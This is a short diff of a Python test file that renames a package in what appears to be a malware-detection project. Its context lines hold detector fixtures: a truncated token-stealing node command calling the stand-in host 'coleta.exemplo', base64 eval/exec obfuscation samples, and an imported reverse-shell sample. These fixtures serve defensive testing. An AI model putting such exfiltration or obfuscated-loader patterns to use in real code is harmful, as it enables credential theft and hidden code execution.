@@ -2,7 +2,7 @@ import json
 
 import pytest
 
-from guardiao import dev
+from guarnicao import dev
 
 from .test_yara import REVERSE_SHELL
 
@@ -11,7 +11,7 @@ ROUBA_TOKEN = "".join(["node -e \"require('https').get('https://coleta.exemplo/?
 OFUSCADO = "".join(["eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base", "64').toString())"])
 SETUP_MALICIOSO = "".join(["import base64\nexec(base", "64.b64decode('cHJpbnQoMSk='))\n"])
 
-requer_yara = pytest.mark.skipif(not __import__("guardiao.regras_yara").regras_yara.disponivel(),
+requer_yara = pytest.mark.skipif(not __import__("guarnicao.regras_yara").regras_yara.disponivel(),
                                  reason="yara-x não instalado")
 
 
